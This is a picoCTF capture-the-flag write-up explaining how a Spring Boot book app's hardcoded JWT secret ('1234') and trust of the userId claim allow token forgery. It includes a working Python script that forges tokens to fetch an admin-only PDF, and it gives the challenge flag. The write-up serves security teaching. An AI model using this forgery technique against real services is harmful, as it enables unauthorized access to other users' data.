# Java Code Analysis!?!

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{w34k_jwt_n0t_g00d_ca4d9701}`

## Summary

A Spring Boot book-reading app signs its JWTs with a "randomly generated" secret that is
actually a hardcoded literal string, and trusts the `userId` claim from any validly-signed JWT
without ever re-checking it against the authenticated account at login time. Combined, this lets
any authenticated user forge a token claiming a different user's ID, inheriting that user's real
database role for authorization checks that look the ID back up, with zero knowledge of that
user's actual credentials.

## Discovery

The provided source shows the JWT signing key comes from `SecretGenerator`:

```java
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```

`ReauthenticationFilter` builds the authenticated principal directly from whatever the JWT
claims, with its own comment admitting the trust assumption:

```java
grantedAuthorities.add(new UserAuthority(jwtUserInfo.getUserId(), jwtUserInfo.getRole()));
// I trust the user input here :) They'll never be evil, or will they?
```

The PDF download endpoint's authorization check, however, doesn't trust the JWT's `role` claim
directly, it re-fetches the *real* user record from the database by the (attacker-controlled)
`userId` and compares that record's actual role:

```java
@PostAuthorize("@bookPdfAccessCheck.verify(#bookId, authentication.principal.grantedAuthorities[0].userId)")
public PDF getPdf(Integer bookId) { ... }

// BookPdfAccessCheck.verify()
boolean permissionGranted = (user.getRole().getValue() >= book.getRole().getValue());
```

So a forged token doesn't need a forged *role* claim at all, just a forged `userId` belonging to
someone with a higher real role in the database.

## Proof of Concept

Log in normally as the given `user`/`user` account to confirm the JWT shape and that `userId: 1`
maps to the `Free` role. `GET /base/books` lists a book explicitly requiring `Admin`:

```json
{"id":5,"title":"Flag","desc":"You need to have Admin role to access this special book!","role":"Admin"}
```

Forge new tokens (secret `"1234"`, HS256, issuer `bookshelf`) for a range of candidate user IDs
and request the Admin-only book's PDF with each:

```python
import jwt, time, requests

for uid in range(1, 11):
    payload = {"role": "Free", "iss": "bookshelf",
               "exp": int(time.time())+3600, "iat": int(time.time()),
               "userId": uid, "email": f"probe{uid}@x.com"}
    token = jwt.encode(payload, "1234", algorithm="HS256")
    r = requests.get("http://TARGET/base/books/pdf/5",
                      headers={"Authorization": f"Bearer {token}"})
    print(uid, r.status_code)
```

`userId: 2` returns `200` with the real PDF (every other tested ID returns `403` or a server
error from a nonexistent user). Reading the returned PDF:

```
Great job! Here's your flag:
picoCTF{w34k_jwt_n0t_g00d_ca4d9701}
```

## Root Cause

Two compounding issues: a weak, effectively hardcoded JWT signing secret makes forging
arbitrarily-signed tokens trivial, and the authentication filter builds the security principal's
identity entirely from unverified JWT claims rather than re-validating them against a trusted
source (e.g. re-issuing tokens only through a controlled login flow and never accepting a
client-asserted `userId`). Downstream authorization logic that looks up "the real role for this
ID" only helps if the ID itself can be trusted.

## CWE / OWASP

- **CWE-321**: Use of Hard-coded Cryptographic Key
- **CWE-346**: Origin Validation Error (JWT claims trusted without re-verifying identity)
- **CWE-863**: Incorrect Authorization
- **OWASP A02:2021**: Cryptographic Failures
- **OWASP A01:2021**: Broken Access Control
